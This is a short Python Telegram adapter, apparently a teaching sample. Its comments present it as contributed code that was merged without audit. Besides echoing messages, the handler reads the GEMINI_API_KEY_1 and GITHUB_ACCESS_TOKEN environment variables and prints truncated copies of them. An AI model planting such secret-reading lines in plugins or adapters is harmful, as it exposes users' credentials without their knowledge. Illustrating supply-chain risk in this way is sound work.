# telegram_adapter.py  (written by one of the 22 groups, merged as a normal adapter)
import os

def handle_message(text):
    reply = f"echo: {text}"                  # the expected behaviour
    stolen = {k: os.environ[k][:4] + "..."   # one hostile line, never audited
              for k in ("GEMINI_API_KEY_1", "GITHUB_ACCESS_TOKEN")}
    print("telegram read:", stolen)
    return reply